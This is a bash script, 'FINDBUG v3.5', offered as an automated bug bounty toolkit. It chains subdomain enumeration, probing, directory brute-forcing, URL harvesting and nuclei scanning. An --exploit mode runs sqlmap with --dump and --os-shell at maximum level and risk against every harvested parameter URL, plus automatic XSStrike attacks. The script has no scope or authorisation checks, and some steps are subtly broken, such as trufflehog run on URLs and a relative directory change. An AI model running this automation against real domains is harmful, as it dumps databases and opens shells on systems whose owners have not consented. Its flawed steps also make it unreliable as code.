#!/bin/bash

##############################################
#                FINDBUG v3.5                #
# Comprehensive Automated Bug Bounty Toolkit #
#           Author: Jeet Jhaveri             #
##############################################

RED="\033[1;31m"
GREEN="\033[1;32m"
YELLOW="\033[1;33m"
BLUE="\033[1;34m"
RESET="\033[0m"
VERSION="3.5"
START_TIME=$(date +%s)

banner() {
  cat <<"EOF"

 █████▒██▓███  ▓█████▄  ▓█████ ▄▄▄       █    ██   ▄████  ▄▄▄      
▓██   ▒▓██░  ██▒▒██▀ ██▌ ▓█   ▀▒████▄     ██  ▓██▒ ██▒ ▀█▒▒████▄    
▒████ ░▓██░ ██▓▒░██   █▌ ▒███  ▒██  ▀█▄  ▓██  ▒██░▒██░▄▄▄░▒██  ▀█▄  
░▓█▒  ░▒██▄█▓▒ ▒░▓█▄   ▌ ▒▓█  ▄░██▄▄▄▄██ ▓▓█  ░██░░▓█  ██▓░██▄▄▄▄██ 
░▒█░   ▒██▒ ░  ░░▒████▓  ░▒████▒▓█   ▓██▒▒▒█████▓ ░▒▓███▀▒ ▓█   ▓██▒
 ▒ ░   ▒▓▒░ ░  ░ ▒▒▓  ▒  ░░ ▒░ ░▒▒   ▓▒█░░▒▓▒ ▒ ▒  ░▒   ▒  ▒▒   ▓▒█░
 ░     ░▒ ░      ░ ▒  ▒   ░ ░  ░ ▒   ▒▒ ░░░▒░ ░ ░   ░   ░   ▒   ▒▒ ░
 ░ ░   ░░        ░ ░  ░     ░    ░   ▒    ░░░ ░ ░ ░ ░   ░   ░   ▒   
                    ░        ░  ░     ░  ░   ░           ░       ░  ░

FINDBUG $VERSION | Comprehensive Automated Bug Bounty Toolkit
Author: Jeet Jhaveri
EOF
}

log() { echo -e "${GREEN}[+] $1${RESET}"; }
warn() { echo -e "${YELLOW}[!] $1${RESET}"; }
error() { echo -e "${RED}[-] $1${RESET}"; }

spinner() {
  local pid=$1
  local spin='|/-\'
  local delay=0.1
  printf " "
  while ps -p $pid &>/dev/null; do
    for i in $(seq 1 5); do
      printf "\b${spin:i%4:1}"
      sleep $delay
    done
  done
  printf "\b \b"
}

usage() {
  echo -e "${BLUE}Usage: ./findbug.sh -u <target.com> [options]${RESET}
${YELLOW}Options:${RESET}
  ${GREEN}-u <domain>${RESET}       Target domain for scanning ${YELLOW}(required)${RESET}
  ${GREEN}--exploit${RESET}          Enable full exploitation mode (SQLDump, RCE checks, XSS Auto, etc.)
  ${GREEN}--install${RESET}         Install or update all dependencies
  ${GREEN}--version${RESET}         Display version information
  ${GREEN}-h, --help${RESET}        Show this help message
"
  exit 0
}

check_dependencies() {
  export PATH="$HOME/go/bin:$HOME/.local/bin:$PATH"
  local tools=(subfinder assetfinder amass httpx gau nuclei ffuf sqlmap jq trufflehog whatweb)
  for tool in "${tools[@]}"; do
    if ! command -v "$tool" &>/dev/null; then
      error "Missing dependency: $tool"
      warn "Run './findbug.sh --install' to install missing dependencies."
      exit 1
    fi
  done
}

smart_scan() {
  local DOMAIN=$1
  local EXPLOIT_MODE=$2
  local OUTDIR="scans/$DOMAIN"
  local WORDLIST="$HOME/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt"
  mkdir -p "$OUTDIR"
  cd "$OUTDIR" || exit 1

  run_spinner() {
    log "$1"
    shift
    "$@" &
    spinner $!
    echo
  }

  log "🔎 Subdomain Enumeration"
  (
    subfinder -d $DOMAIN -silent
    assetfinder --subs-only $DOMAIN
    amass enum -passive -d $DOMAIN
  ) | sort -u | tee subdomains.txt

  log "🌐 Probing alive subdomains"
  cat subdomains.txt | httpx -silent | tee alive.txt

  log "🗂️ Directory brute-force with ffuf"
  [[ -f "$WORDLIST" ]] && ffuf -u https://$DOMAIN/FUZZ -w "$WORDLIST" -t 50 -o ffuf.json || warn "No wordlist for ffuf"

  log "📜 Collecting URLs from gau"
  cat alive.txt | gau | sort -u | tee urls_gau.txt

  log "🔑 Finding endpoints with parameters"
  grep "=" urls_gau.txt | sort -u | tee urls_with_params.txt

  log "🧩 Finding JavaScript files"
  grep -Ei "\.js($|\?)" urls_gau.txt | sort -u | tee javascript_files.txt

  log "🔐 Scanning for secrets in JS"
  while read -r jsurl; do trufflehog filesystem "$jsurl"; done <javascript_files.txt || true

  log "🛡️ Checking HTTP tech stack"
  cat alive.txt | whatweb -i - | tee whatweb.txt

  log "🚨 Scanning with nuclei (CVEs, exposures, misconfigurations)"
  cat alive.txt | nuclei -severity low,medium,high,critical -o nuclei-results.txt

  log "👻 Subdomain takeover detection with subzy"
  cat subdomains.txt | subzy run || warn "subzy may require config"

  log "💾 Extracting historical endpoints (waybackurls)"
  cat alive.txt | waybackurls | sort -u | tee waybackurls.txt

  log "🔍 Finding hidden parameters (ParamSpider)"
  cd ~/tools/ParamSpider || true
  python3 paramspider.py --domain $DOMAIN --exclude woff,css,png,svg,ico,jpg,js -o $OUTDIR/paramspider.txt || true
  cd "$OUTDIR"

  if [[ "$EXPLOIT_MODE" == "true" ]]; then
    log "${RED}⚔️ EXPLOIT MODE ENABLED${RESET}"

    log "💣 SQL Injection Auto-Exploitation"
    for url in $(cat urls_with_params.txt); do
      echo -e "\n[SQLMAP] Testing $url"
      sqlmap -u "$url" --batch --level=5 --risk=3 --random-agent --threads=5 --dump --os-shell || true
    done

    log "☠️ XSS Auto exploitation with XSStrike"
    cd ~/tools/XSStrike || true
    for url in $(cat "$OUTDIR/urls_with_params.txt"); do
      echo -e "\n[XSStrike] Testing $url"
      python3 xsstrike.py -u "$url" --crawl --auto || true
    done
    cd "$OUTDIR"

    log "📜 Exploit CVEs with specific nuclei templates"
    cat alive.txt | nuclei -t ~/nuclei-templates/exposures/ -severity critical,high || true
  else
    warn "💻 Exploitation skipped. Use --exploit to enable."
  fi

  local END_TIME=$(date +%s)
  local TOTAL_TIME=$((END_TIME - START_TIME))
  echo -e "${GREEN}✅ Scan completed in ${TOTAL_TIME}s${RESET}"
}

######## MAIN ########
banner
case "$1" in
--install)
  bash ./install.sh
  exit 0
  ;;
--help | -h) usage ;;
--version)
  echo "FINDBUG v$VERSION"
  exit 0
  ;;
esac

DOMAIN=""
EXPLOIT_MODE="false"

while [[ $# -gt 0 ]]; do
  case "$1" in
  -u)
    DOMAIN="$2"
    shift 2
    ;;
  --exploit)
    EXPLOIT_MODE="true"
    shift
    ;;
  -h | --help) usage ;;
  *) shift ;;
  esac
done

[[ -z "$DOMAIN" ]] && usage
check_dependencies
smart_scan "$DOMAIN" "$EXPLOIT_MODE"
